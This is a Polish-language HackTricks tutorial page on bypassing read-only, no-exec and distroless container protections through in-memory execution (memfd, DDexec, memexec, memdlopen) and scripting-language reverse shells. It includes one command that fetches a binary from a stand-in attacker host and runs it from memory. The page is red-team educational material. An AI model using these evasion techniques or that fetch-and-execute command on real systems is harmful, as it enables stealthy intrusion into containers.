# Bypass FS protections: read-only / no-exec / Distroless

<details>

<summary><strong>Zacznij od zera i stań się ekspertem od hakowania AWS dzięki</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="https://github.com/carlospolop/hacktricks/blob/pl/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>

Jeśli interesuje Cię **kariera hakerska** i hakowanie niemożliwych do zhakowania rzeczy - **rekrutujemy!** (_wymagana biegła znajomość języka polskiego, zarówno pisanego, jak i mówionego_).

{% embed url="https://www.stmcyber.com/careers" %}

## Filmy

W poniższych filmach znajdziesz techniki omówione na tej stronie wyjaśnione bardziej szczegółowo:

* [**DEF CON 31 - Badanie manipulacji pamięcią Linuxa dla Stealth i Ewazji**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**Intruzje stealth z DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## Scenariusz tylko do odczytu / brak wykonywania

Coraz częściej spotyka się maszyny z systemem Linux zamontowanym z zabezpieczeniem **tylko do odczytu (ro)**, zwłaszcza w kontenerach. Jest to dlatego, że uruchomienie kontenera z systemem plików ro jest tak proste jak ustawienie **`readOnlyRootFilesystem: true`** w `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Jednak nawet jeśli system plików jest zamontowany jako ro, **`/dev/shm`** nadal będzie zapisywalny, więc nie jest prawdą, że nie możemy nic zapisać na dysku. Jednak ten folder będzie **zamontowany z ochroną no-exec**, więc jeśli pobierzesz tu binarny plik, **nie będziesz w stanie go wykonać**.

{% hint style="warning" %}
Z perspektywy zespołu czerwonego, to sprawia, że **trudno jest pobrać i wykonać** binarne pliki, które nie są już w systemie (jak backdoory lub narzędzia do wyliczania, takie jak `kubectl`).
{% endhint %}

## Najprostsze ominięcie: Skrypty

Zauważ, że wspomniałem o binariach, możesz **wykonać dowolny skrypt**, o ile interpreter jest wewnątrz maszyny, jak **skrypt powłoki** jeśli `sh` jest obecne lub **skrypt pythonowy** jeśli zainstalowany jest `python`.

Jednak to nie wystarczy do wykonania swojego binarnego backdoora lub innych narzędzi binarnych, które mogą być potrzebne do uruchomienia.

## Ominięcia pamięci

Jeśli chcesz wykonać binarny plik, ale system plików nie zezwala na to, najlepszym sposobem jest **wykonanie go z pamięci**, ponieważ **zabezpieczenia nie mają zastosowania tam**.

### Ominięcie FD + exec syscall

Jeśli masz potężne silniki skryptowe wewnątrz maszyny, takie jak **Python**, **Perl** lub **Ruby**, możesz pobrać binarny plik do wykonania z pamięci, przechować go w deskryptorze pliku w pamięci (`create_memfd` syscall), który nie będzie chroniony przez te zabezpieczenia, a następnie wywołać **`exec syscall`** wskazując **fd jako plik do wykonania**.

Do tego możesz łatwo użyć projektu [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Możesz przekazać mu binarny plik, a on wygeneruje skrypt w wskazanym języku z **binarnym skompresowanym i zakodowanym w base64** oraz instrukcjami do **dekodowania i rozpakowania** go w **fd** utworzonym za pomocą wywołania `create_memfd` syscall oraz wywołania **exec syscall** do jego uruchomienia.

{% hint style="warning" %}
To nie działa w innych językach skryptowych, takich jak PHP lub Node, ponieważ nie mają one **domyślnego sposobu na wywołanie surowych wywołań systemowych** z poziomu skryptu, więc nie można wywołać `create_memfd` do utworzenia **deskryptora pamięci** do przechowywania binarnego pliku.

Co więcej, utworzenie **zwykłego deskryptora pliku** z plikiem w `/dev/shm` nie zadziała, ponieważ nie będziesz mógł go uruchomić, ponieważ zastosowana zostanie **ochrona no-exec**.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) to technika, która pozwala **modyfikować pamięć własnego procesu**, nadpisując jego **`/proc/self/mem`**.

Dlatego **kontrolując kod asemblera**, który jest wykonywany przez proces, możesz napisać **shellcode** i "zmienić" proces, aby **wykonał dowolny arbitralny kod**.

{% hint style="success" %}
**DDexec / EverythingExec** pozwoli Ci załadować i **wykonać** swój własny **shellcode** lub **dowolny binarny plik** z **pamięci**.
{% endhint %}

```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```

### MemExec

[**Memexec**](https://github.com/arget13/memexec) to naturalny kolejny krok po DDexec. To **zdemilitaryzowany shellcode DDexec**, więc za każdym razem, gdy chcesz **uruchomić inny plik binarny**, nie musisz ponownie uruchamiać DDexec, możesz po prostu uruchomić shellcode memexec za pomocą techniki DDexec, a następnie **komunikować się z tym demonem, aby przekazać nowe pliki binarne do załadowania i uruchomienia**.

Możesz znaleźć przykład, jak **użyć memexec do uruchamiania plików binarnych z odwróconym powłoką PHP** w [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

O podobnym celu do DDexec, technika [**memdlopen**](https://github.com/arget13/memdlopen) umożliwia **łatwiejsze ładowanie plików binarnych** do późniejszego wykonania. Może nawet umożliwić ładowanie plików binarnych z zależnościami.

## Ominięcie Distroless

### Co to jest distroless

Kontenery Distroless zawierają tylko **niezbędne składniki do uruchomienia określonej aplikacji lub usługi**, takie jak biblioteki i zależności czasu wykonania, ale wykluczają większe składniki, takie jak menedżer pakietów, powłoka lub narzędzia systemowe.

Celem kontenerów Distroless jest **zmniejszenie powierzchni ataku kontenerów poprzez eliminowanie zbędnych składników** i minimalizowanie liczby podatności, które mogą być wykorzystane.

### Odwrócona powłoka

W kontenerze Distroless możesz **nawet nie znaleźć `sh` ani `bash`** do uzyskania zwykłej powłoki. Nie znajdziesz również binarnych takich jak `ls`, `whoami`, `id`... wszystko, co zazwyczaj uruchamiasz w systemie.

{% hint style="warning" %}
Dlatego **nie** będziesz w stanie uzyskać **odwróconej powłoki** ani **wyliczyć** systemu, jak zazwyczaj robisz.
{% endhint %}

Jednak jeśli skompromitowany kontener uruchamia na przykład aplikację internetową flask, to zainstalowany jest Python, więc możesz zdobyć **odwróconą powłokę Pythona**. Jeśli uruchamia node, możesz zdobyć odwróconą powłokę Node, podobnie z większością **języków skryptowych**.

{% hint style="success" %}
Korzystając z języka skryptowego, możesz **wyliczyć system** korzystając z możliwości języka.
{% endhint %}

Jeśli nie ma **protekcji `read-only/no-exec`**, możesz wykorzystać swoją odwróconą powłokę do **zapisywania swoich plików binarnych w systemie plików** i **wykonywania** ich.

{% hint style="success" %}
Jednak w tego rodzaju kontenerach te protekcje zazwyczaj istnieją, ale możesz użyć **poprzednich technik wykonania w pamięci, aby je ominąć**.
{% endhint %}

Możesz znaleźć **przykłady**, jak **wykorzystać niektóre podatności RCE** do uzyskania **odwróconych powłok języków skryptowych** i uruchamiania plików binarnych z pamięci w [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="https://github.com/carlospolop/hacktricks/blob/pl/.gitbook/assets/image%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1)%20(1).png" alt=""><figcaption></figcaption></figure>

Jeśli jesteś zainteresowany **karierą w dziedzinie hakowania** i hakiem na niehakowalne - **rekrutujemy!** (_wymagana biegła znajomość języka polskiego w mowie i piśmie_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
